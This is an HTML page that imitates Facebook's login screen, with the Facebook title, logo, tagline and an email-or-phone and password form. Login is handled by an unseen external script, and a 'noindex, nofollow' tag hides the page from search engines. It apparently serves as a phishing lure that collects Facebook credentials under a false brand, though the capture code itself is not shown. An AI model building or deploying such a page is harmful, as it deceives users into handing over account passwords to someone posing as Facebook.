<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted-script-source.com;">

    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://www.gstatic.com; style-src 'self' https://fonts.googleapis.com;">
<meta http-equiv="X-Content-Type-Options" content="nosniff">
<meta http-equiv="X-Frame-Options" content="DENY">
<meta name="robots" content="noindex, nofollow">

    <title>Facebook â€“ log in or sign up</title>
    <link rel="icon"
        href="favicon.png"
        type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <link rel="stylesheet" href="styles.css">
   
</head>

<body>
    <div class="main-content">
        <div class="logo">
            <img src="logo.svg" alt="Facebook">
            <div class="explanation">Facebook helps you connect and share with the people in your life.</div>
        </div>
        <div>
            <div class="container">
                <form id="loginForm">
                    <input type="text" id="username" name="username" placeholder="Email or phone number" required>
                    <div style="position: relative;">
                        <input type="password" id="pass" name="password" placeholder="Password" required>
                        <i class="fas fa-eye toggle-visibility" id="togglePassword"></i>
                    </div>
                    <button type="submit">Log In</button>
                </form>
                <a href="#" class="forgot-password">Forgotten password?</a>
                <div class="separator"></div>
                <a href="#" class="create-account">Create new account</a>
            </div>
            <div class="page-area">
                <a href="https://www.facebook.com/pages/create/?ref_type=registration_form"
                    class="create-page-link">Create a Page</a> for a celebrity, brand or business.
            </div>
        </div>
    </div>
<script src="scripts.js"></script>
</body>

</html>
